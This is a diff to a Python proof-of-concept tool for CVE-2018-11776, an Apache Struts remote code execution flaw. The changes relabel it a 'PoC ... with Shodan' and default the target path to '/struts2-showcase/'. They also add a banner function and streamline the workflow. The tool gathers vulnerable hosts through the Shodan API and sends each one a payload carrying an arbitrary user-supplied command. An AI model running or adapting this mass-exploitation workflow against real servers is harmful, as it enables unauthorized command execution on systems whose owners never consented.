@@ -10,7 +10,7 @@ requests.packages.urllib3.disable_warnings()
 
 __author__ = "Ekultek"
 __twitter__ = "@stay__salty"
-__description__ = "Check hosts for CVE-2018-11776"
+__description__ = "PoC for CVE-2018-11776 with Shodan ;)"
 
 
 class Parser(argparse.ArgumentParser):
@@ -25,12 +25,12 @@ class Parser(argparse.ArgumentParser):
         parser.add_argument("-a", "--agent", dest="userAgent", metavar="AGENT", help="pass a User-Agent")
         parser.add_argument("-p", "--proxy", dest="proxyToUse", metavar="PROXY", help="pass a proxy")
         parser.add_argument("-s", "--shodan", dest="shodanKey", metavar="API-KEY", help="pass your shodan API key")
+        parser.add_argument("-q", "--query", dest="searchQuery", metavar="QUERY", help="pass a search query")
+        parser.add_argument("-t", "--path", dest="targetPath", metavar="PATH", help="provide a path to the target")
         parser.add_argument("-c", "--connect", dest="connectShodan", action="store_true", default=False,
                             help="connect to Shodan API and find hosts")
         parser.add_argument("-C", "--command", dest="commandToExecute", metavar="COMMAND",
                             help="pass a command to execute")
-        parser.add_argument("-q", "--query", dest="searchQuery", metavar="QUERY", help="pass a search query")
-        parser.add_argument("-t", "--path", dest="targetPath", metavar="PATH", help="provide a path to the target")
         return parser.parse_args()
 
 
@@ -107,16 +107,16 @@ def check_opts(opts):
     if opts.connectShodan and opts.shodanKey is None:
         print("[!] no Shodan API key supplied `-s <KEY>`")
         exit(-1)
-
     if opts.targetPath is None:
-        print("[!] no path provided on target, this will likely fail")
-        retval["path"] = None
+        print("[!] no path provided on target defaulting to '/struts2-showcase/', this will likely fail")
+        retval["path"] = "/struts2-showcase/"
     else:
         retval["path"] = opts.targetPath
-
     if opts.userAgent is None:
-        retval["agent"] = "Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) " \
-                          "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100"
+        retval["agent"] = (
+            "Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) "
+            "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100"
+        )
     else:
         retval["agent"] = opts.userAgent
         print("[+] configuring User-Agent: '{}'".format(opts.userAgent))
@@ -138,29 +138,37 @@ def check_opts(opts):
     return retval
 
 
+def boxxy(text):
+    """
+    create a box around some text
+    """
+    lines = text.splitlines()
+    width = max(len(s) for s in lines) + 1
+    res = ["+" + "-" * width + "+"]
+    for s in lines:
+        res.append("|" + (s + " " * width)[:width] + "|")
+    res.append("+" + "-" * width + "+")
+    print("\n".join(res))
+
+
 def main():
     """
     main function
     """
-    print("\n{}\n-Author: {}\n--Twitter: {}\n---Description: {}\n{}\n".format(
-        "-" * 45, __author__, __twitter__, __description__, "-" * 45
-    ))
+    boxxy("\n-Author: {}\n--Twitter: {}\n---Description: {}\n\n".format(__author__, __twitter__, __description__))
+    print("\n")
     opts = Parser().optparse()
     arguments = check_opts(opts)
     if opts.connectShodan:
-        if opts.shodanKey is not None:
-            print("[+] pulling hosts from Shodan API")
-            hosts = list(shodan_search(opts.shodanKey, arguments["query"]))
-        else:
-            print("[!] no API key supplied `-s <KEY>`")
-            exit(-1)
+        print("[+] pulling hosts from Shodan API")
+        hosts = list(shodan_search(opts.shodanKey, arguments["query"]))
     if opts.hostTarget is not None:
         hosts = [opts.hostTarget]
     print("[+] checking a total of {} hosts\n".format(len(hosts)))
     for i, host in enumerate(hosts, start=1):
         print("[+] checking for CVE-2018-11776 on '{}' ({})".format(host, i))
         host = convert_url(host)
-        host = "{}{}".format(host, arguments["path"] if arguments["path"] is not None else "")
+        host = "{}{}".format(host, arguments["path"])
         payload = create_payload(arguments["command"])
         results = get_page(host, payload, proxy=arguments["proxy"], user_agent=arguments["agent"])
         if results:
